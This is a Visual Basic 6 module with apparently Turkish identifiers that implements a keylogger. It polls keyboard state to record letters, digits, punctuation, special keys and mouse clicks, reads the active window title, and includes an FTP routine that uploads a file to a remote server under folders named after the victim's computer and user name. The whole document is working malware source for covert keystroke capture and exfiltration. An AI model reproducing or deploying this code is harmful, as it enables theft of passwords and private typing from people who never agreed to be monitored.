Attribute VB_Name = "Module1"
Private Declare Function GetAsyncKeyState Lib "user32.dll" ( _
  ByVal vKey As Long) As Long
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Public Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetForegroundWindow Lib "user32" () As Long
Dim c As New cFTP
Public Sayfabasligi As String
Private Function Shift_Tusu() As Boolean
    Shift_Tusu = CBool(GetAsyncKeyState(160) Or GetAsyncKeyState(161))
End Function

Private Function CapsLock_Tusu() As Boolean
    CapsLock_Tusu = CBool(GetKeyState(vbKeyCapital) And 1)
End Function
Private Function Alt_Tusu() As Boolean
    Alt_Tusu = CBool(GetAsyncKeyState(165) Or GetAsyncKeyState(18))
End Function
Public Function ACWINNAME(hwnd As Long) As String
Dim BaslikHwnd As String
    BaslikHwnd = String(GetWindowTextLength(hwnd), 0)
    GetWindowText hwnd, BaslikHwnd, (GetWindowTextLength(hwnd) + 1)
    ACWINNAME = BaslikHwnd
End Function
Public Function GETAlpha()
Dim Retval As Long
 
  
  For i = 65 To 90
  Retval = GetAsyncKeyState(i)
  If CBool(Retval And &H1) Then
    If CapsLock_Tusu = False Then
        If Shift_Tusu = False Then
            Form1.Text2.Text = Form1.Text2.Text & Chr(i + 32)
        Else
            Form1.Text2.Text = Form1.Text2.Text & Chr(i)
        End If
    Else
        If Shift_Tusu = True Then
            Form1.Text2.Text = Form1.Text2.Text & Chr(i + 32)
        Else
            Form1.Text2.Text = Form1.Text2.Text & Chr(i)
        End If
    End If
    End If
    Next i

End Function
Public Function getnumber()
Dim Retval As Long

  For i = 48 To 57
  Retval = GetAsyncKeyState(i)
  
    If CBool(Retval And &H1) Then
     If CapsLock_Tusu = False Then
        If Shift_Tusu = False Then
        Form1.Text2.Text = Form1.Text2.Text & Chr(i)
        Else
    Select Case i
    Case 49: Form1.Text2.Text = Form1.Text2.Text & "!"
    Case 50: Form1.Text2.Text = Form1.Text2.Text & Chr(34)
    Case 51: Form1.Text2.Text = Form1.Text2.Text & "§"
    Case 52: Form1.Text2.Text = Form1.Text2.Text & "$"
    Case 53: Form1.Text2.Text = Form1.Text2.Text & "%"
    Case 54: Form1.Text2.Text = Form1.Text2.Text & "&"
    Case 55: Form1.Text2.Text = Form1.Text2.Text & "/"
    Case 56: Form1.Text2.Text = Form1.Text2.Text & "("
    Case 57: Form1.Text2.Text = Form1.Text2.Text & ")"
    Case 48: Form1.Text2.Text = Form1.Text2.Text & "="
    End Select
    End If
   Else
        If Shift_Tusu = True Then
           Form1.Text2.Text = Form1.Text2.Text & Chr(i)
        Else
    Select Case i
    Case 49: Form1.Text2.Text = Form1.Text2.Text & "!"
    Case 50: Form1.Text2.Text = Form1.Text2.Text & Chr(34)
    Case 51: Form1.Text2.Text = Form1.Text2.Text & "§"
    Case 52: Form1.Text2.Text = Form1.Text2.Text & "$"
    Case 53: Form1.Text2.Text = Form1.Text2.Text & "%"
    Case 54: Form1.Text2.Text = Form1.Text2.Text & "&"
    Case 55: Form1.Text2.Text = Form1.Text2.Text & "/"
    Case 56: Form1.Text2.Text = Form1.Text2.Text & "("
    Case 57: Form1.Text2.Text = Form1.Text2.Text & ")"
    Case 48: Form1.Text2.Text = Form1.Text2.Text & "="
   
    End Select
    End If
     End If
    End If
    Next i
End Function
Public Function getklick()
Dim Retval As Long

  
  Retval = GetAsyncKeyState(1)
  If CBool(Retval And &H1) Then
  Form1.Text2.Text = Form1.Text2.Text & "[LC]"
  End If
  Retval = GetAsyncKeyState(2)
  If CBool(Retval And &H1) Then
  Form1.Text2.Text = Form1.Text2.Text & "[RC]"
  End If
  Retval = GetAsyncKeyState(4)
  If CBool(Retval And &H1) Then
  Form1.Text2.Text = Form1.Text2.Text & "[MC]"
  End If
Retval = GetAsyncKeyState(91)
  If CBool(Retval And &H1) Then
  Form1.Text2.Text = Form1.Text2.Text & "[Win]"
  End If
End Function
Public Function getspecial()
Dim Retval As Long
 
  For i = 8 To 47
  Retval = GetAsyncKeyState(i)
    If CBool(Retval And &H1) Then
    Select Case i
    Case 8: Form1.Text2.Text = Form1.Text2.Text & "[Del]"
    Case 9: Form1.Text2.Text = Form1.Text2.Text & "[Tab]"
    Case 13: Form1.Text2.Text = Form1.Text2.Text & "[Ent]"
    'Case 16: form1.text2.Text = form1.text2.Text & "[Shi]"
    'Case 17: form1.text2.Text = form1.text2.Text & "[Str]"
    'Case 18: form1.text2.Text = form1.text2.Text & "[Alt]"
    Case 19: Form1.Text2.Text = Form1.Text2.Text & "[Pau]"
    Case 20: Form1.Text2.Text = Form1.Text2.Text & "[Cap]"
    Case 27: Form1.Text2.Text = Form1.Text2.Text & "[Esc]"
    Case 32: Form1.Text2.Text = Form1.Text2.Text & "[Spc]"
    Case 37: Form1.Text2.Text = Form1.Text2.Text & "[Left]"
    Case 38: Form1.Text2.Text = Form1.Text2.Text & "[Up]"
    Case 39: Form1.Text2.Text = Form1.Text2.Text & "[Right]"
    Case 40: Form1.Text2.Text = Form1.Text2.Text & "[Down]"
    Case 44: Form1.Text2.Text = Form1.Text2.Text & "[Drk]"
    Case 46: Form1.Text2.Text = Form1.Text2.Text & "[Enf]"
    Case 45: Form1.Text2.Text = Form1.Text2.Text & "[Einf]"
    End Select
    End If
    Next i
     
     For i = 188 To 190
  Retval = GetAsyncKeyState(i)
    If CBool(Retval And &H1) Then
    If CapsLock_Tusu = False Then
        If Shift_Tusu = False Then
            Select Case i
            Case 188: Form1.Text2.Text = Form1.Text2.Text & ","
            Case 189: Form1.Text2.Text = Form1.Text2.Text & "-"
            Case 190: Form1.Text2.Text = Form1.Text2.Text & "."
            End Select
        Else
            Select Case i
            Case 188: Form1.Text2.Text = Form1.Text2.Text & ";"
            Case 189: Form1.Text2.Text = Form1.Text2.Text & "_"
            Case 190: Form1.Text2.Text = Form1.Text2.Text & ":"
            End Select
    End If
Else
       If Shift_Tusu = True Then
            Select Case i
            Case 188: Form1.Text2.Text = Form1.Text2.Text & ","
            Case 189: Form1.Text2.Text = Form1.Text2.Text & "-"
            Case 190: Form1.Text2.Text = Form1.Text2.Text & "."
            End Select
        Else
            Select Case i
            Case 188: Form1.Text2.Text = Form1.Text2.Text & ";"
            Case 189: Form1.Text2.Text = Form1.Text2.Text & "_"
            Case 190: Form1.Text2.Text = Form1.Text2.Text & ":"
            End Select
    End If
    End If
    End If
    Next i
    
End Function

Sub ftpyebaglan(ftp As String, kullanici As String, Sifre As String, dizin As String, dosyayolu As String, uploadyolu As String)
      Call c.Connect(ftp, kullanici, Sifre, "21", True)
      Call c.SetCurrentDirectory("\")
      Call c.CreateDirectory(Environ("Computername"))
Call c.SetCurrentDirectory(Environ("Computername"))
Call c.CreateDirectory(Environ("Username"))
Call c.SetCurrentDirectory(Environ("Username"))
Call c.PutFile(dosyayolu, uploadyolu)

End Sub

